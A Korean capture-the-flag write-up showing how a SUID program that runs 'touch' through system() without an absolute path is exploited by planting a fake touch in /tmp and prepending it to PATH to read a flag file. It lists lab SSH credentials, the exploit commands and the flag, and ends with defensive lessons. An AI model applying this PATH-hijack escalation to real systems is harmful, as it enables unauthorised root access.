# 문제 29 - Command Injection 기반 권한상승 Challenge Solution

## 문제 설명
SSH를 통해 question29 계정으로 접속한 후, command injection 취약점을 이용하여 권한을 상승시키고 플래그를 찾는 문제입니다.

## 풀이 과정
1. SSH 접속
   - 호스트: ip.firewall-flame.kro.kr
   - 포트: 2226
   - 계정: question30
   - 비밀번호: question30pass

2. 코드 분석
   - question29 파일을 분석하면 다음과 같은 취약점을 발견할 수 있습니다:
   ```c
   sprintf(command, "touch %d", pid);
   system(command);
   ```
   - system() 함수가 'touch' 명령어를 실행할 때 PATH를 검색하는 취약점이 있습니다

3. 권한 상승 실행
   ```bash
   # PATH 인젝션을 위한 디렉토리 생성
   mkdir /tmp/ax
   
   # 가짜 touch 명령어 생성
   echo "cat /home/Challenge29/question29flag/flag.txt" > /tmp/ax/touch
   
   # 실행 권한 부여
   chmod 777 /tmp/ax/touch
   
   # PATH 환경변수 수정하여 실행
   PATH=/tmp/ax:$PATH ./question29
   ```

4. 취약점 설명
   - 프로그램이 절대 경로 없이 'touch' 명령어를 실행함
   - PATH 환경변수를 조작하여 악성 touch 명령어를 실행할 수 있음
   - 프로그램의 SUID 권한으로 인해 flag 파일을 읽을 수 있음

## 사용된 기술
- PATH 환경변수 조작
- Command Injection
- SUID 권한을 이용한 권한 상승
- 시스템 함수 취약점 이용

## 보안 교훈
1. system() 함수 사용 시 명령어의 전체 경로를 지정해야 합니다
2. 환경변수 조작 가능성을 고려해야 합니다
3. SUID 프로그램 작성 시 특별한 주의가 필요합니다
4. 외부 명령어 실행 시 안전한 방법을 사용해야 합니다

## 최종 플래그
```
flag{4368616c6c656e6765666c6167}